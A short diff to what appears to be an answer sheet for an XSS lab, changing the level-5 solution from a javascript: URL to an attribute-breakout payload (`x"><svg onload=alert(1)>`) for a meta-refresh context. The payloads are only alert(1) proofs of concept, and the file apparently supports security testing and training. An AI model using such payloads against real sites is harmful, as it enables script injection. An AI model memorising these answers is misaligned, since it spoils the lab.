@@ -38,10 +38,10 @@ Real-world input vectors: headers, JSON/multipart bodies, redirect sinks, cookie
 
 ### realworld_input-level5
 
-`/realworld-input/level5/?url=javascript%3Aalert(1)`
+`/realworld-input/level5/?url=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: meta refresh content="0;url=QUERY"
+- payload: `x"><svg onload=alert(1)>`
+- context: meta refresh content="0;url=…"; Chrome blocks javascript: refresh, so break out of the attribute
 
 ### realworld_input-level6
 
